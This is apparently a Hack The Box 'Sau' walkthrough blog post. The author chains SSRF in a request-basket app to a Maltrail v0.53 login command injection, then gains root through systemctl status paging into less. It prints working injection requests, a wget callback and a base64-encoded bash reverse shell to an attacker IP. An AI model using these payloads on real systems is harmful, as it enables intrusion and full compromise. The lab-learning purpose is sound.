---
layout: post
title: Hack The Box Walkthrough - Sau
#date: 2024-01-06
date: 2023-12-28
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2024/01/HTB/Sau
img: 2024/01/Sau/Sau.png
---

In Sau, I exploited two known vulnerabilities. One in Maltrail to get a shell. And one in the way `systemd` uses `less` to display the status of a service.

* Room: Sau
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Sau](https://app.hackthebox.com/machines/Sau)
* Author: [sau123](https://app.hackthebox.com/users/201596)

## Enumeration

As always, I began the box by scanning for open ports with Rustscan.

```bash
$ rustscan -a target -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.98.107:22
Open 10.129.98.107:55555
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.

...

Nmap scan report for target (10.129.98.107)                                                                          
Host is up, received user-set (0.039s latency).                                                                      
Scanned at 2023-09-30 09:28:59 EDT for 90s                                                                           
                                                                                                                     
PORT      STATE SERVICE REASON  VERSION                                                                              
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)                         
| ssh-hostkey:                                                                                                       
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)                                                       
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZdSkl
B02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KHTPsIRnr8
ml+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=                                 
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)                 
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=                                                                         
|   256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)         
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi                                 
55555/tcp open  unknown syn-ack                                                                                                                                                                                                            
| fingerprint-strings:                                                                                               
|   FourOhFourRequest:                                                                                               
|     HTTP/1.0 400 Bad Request                                                                                       
|     Content-Type: text/plain; charset=utf-8                                                                        
|     X-Content-Type-Options: nosniff                                                                                
|     Date: Sat, 30 Sep 2023 13:29:32 GMT                                                                            
|     Content-Length: 75                                                                                             
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$                                        
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:                                                                                                               
|     HTTP/1.1 400 Bad Request       
|     Content-Type: text/plain; charset=utf-8
|     Connection: close              
|     Request                        
|   GetRequest:        
|     HTTP/1.0 302 Found             
|     Content-Type: text/html; charset=utf-8
|     Location: /web   
|     Date: Sat, 30 Sep 2023 13:29:06 GMT
|     Content-Length: 27                    
|     href="/web">Found</a>.                                                                                         
|   HTTPOptions:
|     HTTP/1.0 200 OK                          
|     Allow: GET, OPTIONS                                                                                            
|     Date: Sat, 30 Sep 2023 13:29:06 GMT    
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94%I=7%D=9/30%Time=651822A1%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\
SF:x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Sat,\x2030\x20Sep\x20
SF:2023\x2013:29:06\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/w
SF:eb\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x202
SF:00\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Sat,\x2030\x20Sep\x20
SF:2023\x2013:29:06\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options
SF::\x20nosniff\r\nDate:\x20Sat,\x2030\x20Sep\x202023\x2013:29:32\x20GMT\r
SF:\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20nam
SF:e\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\$\
SF:n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:30
Completed NSE at 09:30, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:30
Completed NSE at 09:30, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:30
Completed NSE at 09:30, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.03 seconds
```

There were two open ports. Port 22 (SSH) was open. Port 55555 was also open. I did not know what it was, but the response to nmap made it clear it was HTTP.

## Website

I opened a browser and looked at the website on port 55555.

![Website](/assets/images/2024/01/Sau/Website.png "Website")

The site allowed creating a basket to collect HTTP requests. The kind of site that can be used to test webhooks or XSS payloads. I tried the 'Administration' link on the top right of the page. It required a token.

![Token Required](/assets/images/2024/01/Sau/TokenRequired.png "Token Required")

I created a basket. 

![Empty Basket](/assets/images/2024/01/Sau/EmptyBasket.png "Empty Basket")

It gave me the URL where I could send HTTP requests to be collected. I sent a few requests to the URL. It gave me a blank page, but the requests appeared in my basket.

![Collected Requests](/assets/images/2024/01/Sau/Requests.png "Collected Requests")

I looked at the settings of the basket.

![Settings](/assets/images/2024/01/Sau/Configuration.png "Settings")

There were two interesting settings. The 'Forward URL' allowed me to send the requests somewhere else after capturing them. And the 'Proxy Response' setting allowed sending back the response from the forward URL to the requester. 

I tried to read a local file by setting the forward URL to `file:///etc/passwd`. It failed.

![Read Local File](/assets/images/2024/01/Sau/RequestEtcPasswd.png "Read Local File")

I tried sending the requests to my machine. That worked, but it was not really useful. 

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.99.53 - - [01/Oct/2023 08:12:14] code 501, message Unsupported method ('PUT')
10.129.99.53 - - [01/Oct/2023 08:12:14] "PUT /forward HTTP/1.1" 501 -
10.129.99.53 - - [01/Oct/2023 08:12:33] code 404, message File not found
10.129.99.53 - - [01/Oct/2023 08:12:33] "GET /forward HTTP/1.1" 404 -
```

I left it redirecting to my machine for a few minutes to see if someone else would hit it. But nothing did.

### Server-side Request Forgery

Next, I tried using the Forward URL to read endpoints that were not exposed on the server. I started with port 80 to test it. 

![Read localhost](/assets/images/2024/01/Sau/SSRFConfiguration.png "Read localhost")

I sent a request with Caido and got an interesting response. I loaded it in a browser.

![Maltrail](/assets/images/2024/01/Sau/Maltrail.png "Maltrail")

The page was not rendering correctly since it could not load the images, CSS, and JavaScript. But it showed that it was an instance of [Maltrail](https://github.com/stamparm/maltrail), a tool to detect malicious traffic. It also displayed that it was using version 'v0.53'. I looked for known vulnerability with this version. I quickly found that the login page had a [Remote Code Execution vulnerability](https://github.com/spookier/Maltrail-v0.53-Exploit).

There was a POC in the GitHub repository, but the exploit was simple. I just needed to send the login form with a username that was a semicolon followed by a command in backticks (\`).

I changed my basket to forward the requests to the login page.

![Forward to Login](/assets/images/2024/01/Sau/ForwardToLogin.png "Forward to Login")

I tried running `id`, but it only replied with 'Login failed', so I did not know if it worked. I tried sending a request to my machine.


```http
POST /rg7my1z HTTP/1.1
Host: target.htb:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: null
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://target.htb:55555/web/j4gxx67
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

username=;`wget+10.10.14.48`
```

I got a hit on my web server.

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.98.107 - - [30/Sep/2023 10:02:44] "GET / HTTP/1.1" 200 -
```

I knew I had code execution. I created a payload to start a reverse shell, making sure I did not have any special characters in it.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.48/4444 0>&1  ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDgvNDQ0NCAwPiYxICAK
```

I sent that payload to the login endpoint.

```http
POST /rg7my1z HTTP/1.1
Host: target.htb:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: null
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://target.htb:55555/web/j4gxx67
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

username=;`echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDgvNDQ0NCAwPiYxICAK+|+base64+-d+|+bash`
```

It gave me a shell, and the user flag.

```
$ nc -klvnp 4444            
listening on [any] 4444 ...
connect to [10.10.14.48] from (UNKNOWN) [10.129.98.107] 46834
bash: cannot set terminal process group (878): Inappropriate ioctl for device
bash: no job control in this shell

puma@sau:/opt/maltrail$ whoami
whoami
puma

puma@sau:/opt/maltrail$ ls ~/
ls ~/
user.txt

puma@sau:/opt/maltrail$ cat ~/user.txt
cat ~/user.txt
REDACTED
```

## Getting root

Once connected, I checked if I could run anything with `sudo`.


```bash
puma@sau:~$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

puma@sau:~$ sudo /usr/bin/systemctl status trail.service
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset: enabled)
     Active: active (running) since Sun 2023-10-01 11:50:01 UTC; 50min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 881 (python3)
      Tasks: 6 (limit: 4662)
     Memory: 18.5M
     CGroup: /system.slice/trail.service
             ├─ 881 /usr/bin/python3 server.py
             ├─1170 /bin/sh -c logger -p auth.info -t "maltrail[881]" "Failed password for ;`echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTEvNDQ0NCAwPiYxICAK | base64 -d | bash` from 127.0.0.1 port 54686"
             ├─1171 /bin/sh -c logger -p auth.info -t "maltrail[881]" "Failed password for ;`echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTEvNDQ0NCAwPiYxICAK | base64 -d | bash` from 127.0.0.1 port 54686"
             ├─1174 bash
             └─1175 bash -i

Oct 01 11:50:01 sau systemd[1]: Started Maltrail. Server of malicious traffic detection system.
Oct 01 12:30:39 sau maltrail[1153]: Failed password for None from 127.0.0.1 port 51726
Oct 01 12:31:45 sau maltrail[1166]: Failed password for ;uid=1001(puma) gid=1001(puma) groups=1001(puma) from 127.0.0.1 port 57082
```

I was able to check the status of the Maltrail service. Which showed me that my `id` command had run, but not much else. I looked for ways to exploit this. [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/#sudo) had something, but it required changing an environment variable. I could not.

I looked for vulnerabilities in running status. I found [a recent one](https://nvd.nist.gov/vuln/detail/CVE-2023-26604). It mentioned how `less` could be used when the terminal is too small to display the output. It would be executed as root in those cases. I knew that `less` could be used to run commands. 

I made my terminal smaller and gave it a try. The output was displayed with `less`. I typed `!bash` to launch bash as root and read the flag.

```bash
puma@sau:~$ sudo /usr/bin/systemctl status trail.service
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset: enabled)
     Active: active (running) since Sun 2023-10-01 11:50:01 UTC; 56min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 881 (python3)
      Tasks: 6 (limit: 4662)
     Memory: 18.5M
     CGroup: /system.slice/trail.service
             ├─ 881 /usr/bin/python3 server.py
             ├─1170 /bin/sh -c logger -p auth.info -t "maltrail[881]" "Failed password for ;`echo YmFzaCAgLWkgPiYgL2Rldi9>
             ├─1171 /bin/sh -c logger -p auth.info -t "maltrail[881]" "Failed password for ;`echo YmFzaCAgLWkgPiYgL2Rldi9>
             ├─1174 bash
             └─1175 bash -i

Oct 01 11:50:01 sau systemd[1]: Started Maltrail. Server of malicious traffic detection system.
Oct 01 12:30:39 sau maltrail[1153]: Failed password for None from 127.0.0.1 port 51726
Oct 01 12:31:45 sau maltrail[1166]: Failed password for ;uid=1001(puma) gid=1001(puma) groups=1001(puma) from 127.0.0.1 p>
!bash

root@sau:/home/puma# cat /root/root.txt
REDACTED
```